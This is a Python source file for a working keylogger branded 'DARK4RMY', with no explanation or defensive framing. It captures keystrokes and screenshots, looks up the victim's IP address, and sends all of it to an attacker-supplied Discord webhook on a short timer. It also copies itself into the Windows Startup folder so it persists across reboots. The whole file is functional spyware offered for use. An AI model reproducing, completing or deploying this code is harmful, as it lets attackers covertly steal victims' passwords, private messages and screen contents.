from threading import Timer
from discord_webhook import DiscordWebhook, DiscordEmbed
from pynput.keyboard import Listener
import pyautogui
from io import BytesIO
import threading
import os
import shutil
import sys
import requests

########################################################################################################################################
webhook = "YOUR WEBHOOK"
########################################################################################################################################

class DARK4RMY:
    def __init__(self, interval=1.5):
        self.log = ""
        self.timer = None
        self.interval = interval

    def webhook(self, screenshot_data=None):
        ip = self.getip()
        wh = DiscordWebhook(url=webhook, username="DARK-4RMY", avatar_url="https://abagond.wordpress.com/wp-content/uploads/2020/07/dark-army.png")
        emb = DiscordEmbed(title="", description="[DARK-4RMY](https://rvlt.gg/8ez9akZK)", color="000000")
        emb.set_image(url="https://mir-s3-cdn-cf.behance.net/project_modules/disp/33779762328391.5a8cb66e6f1c5.png")
        emb.add_embed_field(name="", value=f"```{ip}```", inline=False)
        emb.add_embed_field(name="", value=f"```{self.log}```", inline=False)
        wh.add_embed(emb)
        wh.add_file(file=screenshot_data, filename="screenshot.jpg")
        wh.execute()
        self.log = ""

    def getip(self):
        return requests.get("https://ipinfo.io/json").json()

    def timers(self):
        if self.timer:
            self.timer.cancel()
        self.timer = Timer(self.interval, self.send)
        self.timer.start()

    def send(self):
        screenshot_data = self.screenshot()
        self.webhook(screenshot_data=screenshot_data)

    def key(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                self.log += key.char
        except:
            pass
        self.timers()

    def screenshot(self):
        byte = BytesIO()
        pyautogui.screenshot().convert('RGB').save(byte, format='JPEG')
        byte.seek(0)
        return byte

    def listen(self):
        listener = Listener(on_press=self.key)
        listener.start()
        listener.join()

    def startup(self):
        startup = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        path = sys.argv[0]
        dest = os.path.join(startup, os.path.basename(path))
        if not os.path.exists(dest):
            shutil.copyfile(path, dest)

    def main(self):
        self.startup()
        keylogger_thread = threading.Thread(target=self.listen)
        keylogger_thread.start()
        keylogger_thread.join()

logger = DARK4RMY()
logger.main()
